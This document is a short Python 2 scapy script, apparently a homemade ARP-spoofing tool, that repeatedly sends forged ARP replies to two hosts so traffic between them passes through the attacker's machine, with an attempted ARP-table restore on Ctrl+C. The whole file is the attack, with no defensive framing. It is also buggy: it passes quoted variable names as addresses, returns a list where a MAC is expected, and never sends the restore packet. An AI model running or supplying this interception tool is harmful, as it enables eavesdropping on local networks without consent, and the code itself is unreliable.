import scapy.all as scapy
import time
import sys
target_ip=raw_input("enter target IP>>>>>>\t\t")
destination_ip=raw_input("enter destination Ip>>>>>>\t\t")
def get_mac(ip):
    arp_request=scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcat=broadcast/arp_request
    answerd_list=scapy.srp(arp_request_broadcat,timeout=1,verbose=False)[0]
    return answerd_list
def spoof(target_ip,spoof_ip):
    target_mac=get_mac(target_ip)
    packet=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet,verbose=False)

def restore(destination_ip,source_ip):
    destination_mac=get_mac(destination_ip)
    packet=scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip)
send_packet_count=0
try:
     while True:
        spoof("target_ip","destination_ip")
        spoof("destination_ip","target_ip")
        send_packet_count=send_packet_count+2
        #time.sleep(2)
        print("\r[+]packet send:"+str(send_packet_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
   print("\n[+]detect CTRL+C\t\t>>>>>>>>>>>>>\n restorring ARP")
   restore("destination_ip","target_ip")
   restore("target_ip","destination_ip")
